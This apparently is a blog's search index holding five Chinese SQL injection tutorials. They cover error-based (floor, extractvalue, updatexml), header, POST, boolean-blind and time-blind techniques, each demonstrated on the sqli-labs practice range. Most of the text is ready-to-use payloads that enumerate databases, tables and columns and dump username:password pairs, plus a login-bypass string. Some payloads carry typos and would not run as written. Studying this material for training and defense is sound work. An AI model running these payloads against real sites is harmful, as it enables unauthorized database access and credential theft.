<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>基于报错注入</title>
    <url>/2019/10/20/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><strong>适用场景：页面返回错误连接信息</strong></p>
<h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><p><strong>floor()函数，去除小数部分，向下取整</strong></p>
<p><strong>rand()函数,产生0~1的随机数</strong></p>
<p><strong>rand(x)：x对应一个固定的值，但连续多次执行会变化。</strong></p>
<p><strong>floor(rand(0)*2)产生的序列为011011。</strong></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​        <em>利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错</em></p>
<pre><code>select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</code></pre><p><em>这里的group by直接与floor(rand(0)*2)连接，由于floor(rand(0)*2)产生的随机序列为011011，下面就是数据库内的运算</em></p>
<p><em>首先建立一张虚拟表：</em></p>
<table>
<thead>
<tr>
<th align="center">key</th>
<th align="center">count(*)</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p><em>接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(<strong>*</strong>)置1。</em></p>
<table>
<thead>
<tr>
<th align="center">key</th>
<th align="center">count(*)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p><em>继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(<strong>*</strong>)处加上1即可。</em></p>
<table>
<thead>
<tr>
<th align="center">key</th>
<th align="center">count(*)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p><em>继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(<strong>*</strong>)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。</em></p>
<h3 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
<p><em>爆库：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545631.48.png" alt=""></p>
<p><em>爆表：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from
information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540382.23.png" alt=""></p>
<p><em>爆列名：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x23,floor(rand(0)*2)) as x from
information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540628.93.png" alt=""></p>
<p><em>爆字段：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545733.87.png" alt=""></p>
<h2 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h2><p><strong>Extractvalue(xml_frag,xpath_expr)函数使用XPath表示法从XML字符串中提取值</strong></p>
<p>​        <strong>xml_frag:目标xml文档</strong></p>
<p>​        <strong>xpath_expr:利用xpath路径法表示的查找路径</strong></p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​        <em>xpath格式语法书写错误会报错</em></p>
<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541686.75.png" alt=""></p>
<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;database()&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541929.49.png" alt=""></p>
<h3 id="靶场演示-1"><a href="#靶场演示-1" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
<p><em>爆库：</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571542339.7.png" alt=""></p>
<p><em>爆表：</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545815.1.png" alt=""></p>
<p><em>爆列：</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545896.07.png" alt=""></p>
<p><em>爆字段：</em></p>
<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545937.95.png" alt=""></p>
<h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)函数，返回替换的xml片段</strong></p>
<p>​        <strong>XML_document：XML文档的名称，为string格式</strong></p>
<p>​        <strong>XPath_String：XPath格式的字符串</strong></p>
<p>​        <strong>new_value：替换查找到的符合条件的数据，为string格式</strong></p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>​        <em>同extractvalue报错一样，构造错误的Xpath,以达到报错注入</em></p>
<h3 id="靶场演示-2"><a href="#靶场演示-2" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
<p><em>爆库：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),user()),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544448.8.png" alt=""></p>
<p><em>爆表：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571546006.77.png" alt=""></p>
<p><em>爆列：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544642.63.png" alt=""></p>
<p><em>爆字段：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571546058.19.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全 - SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP攻击</title>
    <url>/2019/10/19/HTTP%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>HTTP基础：</p>
<pre><code>Accept:浏览器能够处理的内容类型
Accept-Charset:浏览器能够显示的字符集
Accept-Encoding:浏览器能够处理的压缩编码
Accept-Language:浏览器当前设置的语言
Connection:浏览器与服务器之间的连接类型
cookie：当前页面设置的任何cookie
Host： 发出请求的页面所在的域
Referer:发出请求的页面的URL
User-Agent:浏览器的用户代理字符串
Server:WEB服务器表明自己是什么软件及版本信息。例如：server Apache/2.0.61(Unix)
</code></pre><h1 id="HTTP头部注入"><a href="#HTTP头部注入" class="headerlink" title="HTTP头部注入"></a>HTTP头部注入</h1><p>​        <strong>HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。 HTTP头注入常发生在程序采集用户信息的模块中。例如：</strong></p>
<pre><code>1、X-Forwarded-For/client-IP
2、User-Agent
3、Referer
4、Cookie</code></pre><p>​        <strong>cookie注入：COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。验证登陆是将用户的登陆信息放入COOKIE中来做权限验证的一种方法。</strong></p>
<h2 id="User-Agent头注入"><a href="#User-Agent头注入" class="headerlink" title="User-Agent头注入"></a>User-Agent头注入</h2><p>​        <strong>与注册登录再注入类似，在登陆后insert语句带入查询，产生注入。构造的payload可以基于多种注入，下面以updatexml()报错为例</strong></p>
<p><em>sqlilabs靶场第18关</em></p>
<pre><code>&#39; and updatexnl(1,concat(0x23,database(),0x23),1) and &#39;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571472840.05.png" alt=""></p>
<h2 id="Referer头注入"><a href="#Referer头注入" class="headerlink" title="Referer头注入"></a>Referer头注入</h2><p><strong>与UA头注入类似</strong></p>
<p><em>sqlilabs靶场第19关</em></p>
<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474970.18.png" alt=""></p>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><em>sqlilabs靶场第20关</em></p>
<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1)#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474297.68.png" alt=""></p>
<h1 id="HTTP参数污染攻击"><a href="#HTTP参数污染攻击" class="headerlink" title="HTTP参数污染攻击"></a>HTTP参数污染攻击</h1><p>​        <strong>在GET和POST的HTTP请求中，经常会出现多个参数的情况。在多个参数相同的情况下，HTTP后端可能有不同的处理方式:</strong></p>
<p><em>数据库后台数据:</em></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571475912.48.png" alt=""></p>
<p><em>sqlilabs靶场第29关</em></p>
<pre><code>/sqlilabs/Less-29/?id=1&amp;id=3</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476037.98.png" alt=""></p>
<p><em>构造攻击语句</em></p>
<pre><code>/sqlilabs/Less-29/?id=1&amp;id=3&#39; and updatexml(1,concat(0x23,database(),0x23),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476343.55.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全 - SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>数据库</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>POST注入</title>
    <url>/2019/10/19/POST%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><strong>在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句</strong></p>
<p><em>数据库中创建一个test的表</em></p>
<pre><code>create table TEST(id int(3),username varchar(25),password varchar(25),primary key(id))</code></pre><h2 id="账号登陆"><a href="#账号登陆" class="headerlink" title="账号登陆"></a>账号登陆</h2><p><em>通过SQL的‘or’运算符构造万能密码,以sqlilabs靶场的第11关为例</em></p>
<pre><code>账号：admin&#39; or &#39;1&#39;=&#39;1
密码：随意</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571451380.67.png" alt=""></p>
<p><em>在判断出注入点后，可以利用时间注入、布尔注入、报错注入接着获取更多的信息</em></p>
<p><em>报错注入：</em></p>
<pre><code>uname=admin&#39; or updatexml(1,concat(0x23,database(),0x23),1)#&amp;&amp;passwd=3421412sds</code></pre><p><em>时间注入：</em></p>
<pre><code>uname=admin&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)#passwd=2142dwq</code></pre><p><em>布尔注入：</em></p>
<pre><code>uname=admin&#39; and ascii(substr(database(),1,1)) =115#&amp;&amp;passwd=41234</code></pre><h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p><em>SQL语句：</em></p>
<pre><code>insert into test(id,username,password) values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,&#39;version()&#39;,&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><pre><code>insert into test values(&#39;4&#39;,USER(),&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453303.2.png" alt=""></p>
<p><em>此处的USER()就是构造的payload，单引号闭合会使得payload变成字符串，可以接着获取更多数据库信息</em></p>
<p><em>实际中无法知道数据库中表的列数，可以先尝试用数字代替字符串的列（字符串无法代替数字），错误时会插入失败</em></p>
<pre><code>insert into test values(&#39;1&#39;,2,3,4,5,6,7);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);
</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571453937.25.png" alt=""></p>
<pre><code>insert into test values(&#39;1&#39;,2,3);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);
</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454023.71.png" alt=""></p>
<h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p><em>SQL语句：</em></p>
<pre><code>update test set name=&#39;shiqi&#39; where id=1;
</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=&#39;user()&#39; where id=2-- &#39; where id=2;
</code></pre><pre><code>update test set username=&#39;adwdas&#39;,password=user() where id=1-- &#39; where id=1;
</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571454596.92.png" alt=""></p>
<p><em>与insert类似，除了闭合位置不同，其他的完全一样；此时password处的user()就是构造的攻击语句</em></p>
<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><em>SQL语句：</em></p>
<pre><code>delete from test where id=2;
</code></pre><pre><code>delete from test where id=2 and if(1=1,sleep(5),0);
</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571455212.6.png" alt=""></p>
<p><em>判断出注入点就可以构造其他的攻击语句，获取更多信息</em></p>
]]></content>
      <categories>
        <category>web安全 - SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>POST注入</tag>
      </tags>
  </entry>
  <entry>
    <title>判断注入点</title>
    <url>/2019/10/17/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9/</url>
    <content><![CDATA[<h1 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h1><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>​    <strong>查询语句中的参数没有被引号包起来，如id=1（有些闭合参数不使用引号，而使用括号来闭合）</strong>    </p>
<p><em>payload:</em>        </p>
<pre><code>id=1&#39;                       页面返回错误

id=1+1 或id=3-1             如果存在id=2这条数据，返回结果为真，否者为假
id=1+0                      页面返回正常

id=1 and 1=1                页面返回正常
id=1 and 1=2                页面返回错误

id=1 or 1=1                 页面返回正常，or使得语句恒为真
id=1 or 1=2                 

id=-1 xor 1=1               异或，由于xor是短位运算符，必须先使前面的查询语句报错，否者没有结果。页面返回正常
id=1 xor 1=2               页面返回正确

id=1) and (1=1              页面返回正常

id=1 or &#39;ab&#39;=&#39;a&#39;+&#39;b&#39;        

id=1) or (&#39;ab&#39;=&#39;a&#39;+&#39;b&#39;</code></pre><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><p>​    <strong>查询语句中的参数被引号包起来</strong></p>
<p><em>payload：</em></p>
<pre><code>id=1&#39;                       单引号冲突，查询语句中id=&#39;$id&#39;,再加上一个单引号报错，页面返回错误
id=1&#39;--+                    单引号与后面的注释#抵消，语句正常，页面返回正常

id=1&#39; and &#39;1&#39;=&#39;1            页面返回正常
id=1&#39; and &#39;1&#39;=&#39;2            页面返回错误

id=1&#39; or &#39;1&#39;=&#39;2             or语句恒为真
id=1&#39; or &#39;1&#39;=&#39;1

id=1&#39;)                      根据闭合情况测试，查询语句为id=(&#39;$id&#39;)时加上)

id=1&quot;                       双引号与单引号情况相同</code></pre><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>​    <strong>页面无报错，有回显</strong></p>
<p><em>payload:</em></p>
<pre><code>id=1&#39; and (length(database())=8) --+          当数据库长度为8时，页面返回正常；当数据库长度不为8时，页面返回与正常页面有所差异，页面却不会直接出错

id=1&#39; or (length(databse())&lt;8) --+</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​    <strong>页面无报错，无回显</strong></p>
<p><em>payload:</em></p>
<pre><code>id=1 and if(1=1,sleep(5),1)               如果页面延迟大于5s,则存在注入点
id=1 and if(1=2,sleep(5),1)               如果页面延迟小于5s,则存在注入点

id=1 or if(1=1，sleep(5),1)               使用or判断时，如果or前面的语句为真，会将数据库中所有数据遍历一遍，花费的时间会特别多
id=1 or if(1=2,sleep(5),1)     

id=-1 xor if(1=1,sleep(5),1)              xor同or
id=-1 xor if(1=2,sleep(5),1)</code></pre><h1 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h1><p>​    <strong>页面返回错误连接信息,在正常的地址后尝试判断其他类型注入时，页面会反馈出错误信息</strong></p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p><em>payload:</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),0x23),1)--+      如果页面的错误反馈爆出version()的信息，则可以确定存在注入点</code></pre><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><p><em>payload:</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat(0x23,version(),0x23)) --+    同updatexml</code></pre><h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><p><em>payload:</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,version(),0x23,floor(rand(0)*2)) as x from imformation_schema.tables group by x) as y) --+              同updatexml</code></pre>]]></content>
      <categories>
        <category>web安全 - SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>注入点</tag>
      </tags>
  </entry>
  <entry>
    <title>获取数据库信息</title>
    <url>/2019/10/17/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p><strong>mysql数据库常用函数:</strong></p>
<pre><code>system_user()系统用户名

users()用户名

current_user()当前用户名

session_user()连接数据库的用户名

database() 数据库名

version() MYSQL数据库版本

@@datadir 读取数据库路径

@@basedir MYSQL安装路径

@@version_compile_os 操作系统

concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULL

concat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3

group_concat（str1,str2,str3）,返回str1+str2+str3;

ascii(a)将a转换成其ASCII值

ord(a)将a转换成其ASCII值

left(a,b)从左往右截取字符串a的前b个字符

substr(a,b,c)从b位置开始，截取字符串a的c长度

mid(a,b,c)从位置b开始，截取a字符串的c位

regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p>
<p><em>查询当前数据库：</em></p>
<pre><code>id=-1&#39; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p>
<pre><code>id=-1&#39; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
<pre><code>id=-1&#39; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p>
<pre><code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><em>查询字段值：</em></p>
<pre><code>id=-1&#39; union select 1,2,group_concat(id,username,password) from users--+</code></pre><h1 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h1><h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
<p><em>获取数据库名、版本信息：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p>
<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><p><strong>floor(rand(0)*2)</strong></p>
<p><em>爆库：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库
或：
id=1&#39; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+
或：
id=1&#39; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p>
<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><h2 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h2><p><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
<p><em>爆库：</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p>
<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><em>爆字段：</em></p>
<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><pre><code>ascii()返回指定字符串最左侧字符的ascii值
count()计算结果集的数量
length()返回指定字符串的长度
substr(str,pos,len)
substring(str,pos,len)返回截取的子字符串</code></pre><p><em>判断数据库名的长度</em></p>
<pre><code>id=1&#39; and (length(database())&gt;9) --+
id=1&#39; and (length(database())=9) --+
id=-1&#39; and (length(database())&gt;0) --+</code></pre><p><em>猜数据库名</em></p>
<pre><code>id=1&#39; and (left(database(),1)=&#39;s&#39;)--+从左到右截取一个字符,s对应的ascii值为115
id=1&#39; and ascii(substr(database(),1,1))=115 --+
id=1&#39; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断

id=1&#39; and (left(database(),2)=&#39;se&#39;)--+从左到右截取两个字符</code></pre><p><em>猜当前数据库中表的数量</em></p>
<pre><code>id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+
id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></pre><p><em>猜当前数据库中表名的长度</em></p>
<pre><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库
id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)=6))--+

id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库
id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1)=8))--+</code></pre><p><em>逐个猜解表名</em></p>
<pre><code>格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解

id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解
id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解</code></pre><p><em>猜表中列的数量</em></p>
<pre><code>id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=20 --+</code></pre><p><em>猜列名的长度</em></p>
<pre><code>id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1)) --+
id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=2 --+</code></pre><p><em>猜解列名</em></p>
<pre><code>id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105 --+</code></pre><p><em>猜字段数量</em></p>
<pre><code>id=1&#39; and (select count(username) from security.users)=13 --+</code></pre><p><em>猜字段长度</em></p>
<pre><code>id=1&#39; and length((select username from security.users limit 0,1))=4 --+</code></pre><p><em>dump字段的值</em></p>
<pre><code>id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+
id=1&#39; and ascii(substr((select concat(username,&#39;:&#39;,password) from security.users limit 0,1),1,1))=68--+</code></pre><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p>
<pre><code>if(1,2,3)：如果1为True，则执行2，否则执行3
sleep(x)：执行延迟x秒
ascii(char)：将char转换为对应的ascii码
substr(string,start,len)：从string的start位开始截取len个字符
Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）</code></pre><p><em>查看信息</em></p>
<pre><code>id=1&#39; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名
id=1&#39; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库
id=1&#39; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本</code></pre><p><em>爆表名</em></p>
<pre><code>id=-1&#39; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1</code></pre><p><em>爆列名</em></p>
<pre><code>id=-1&#39; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &#39;admin&#39; limit 0,1</code></pre><p><em>爆数据</em></p>
<pre><code>id=-1&#39; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1</code></pre>]]></content>
      <categories>
        <category>web安全 - SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
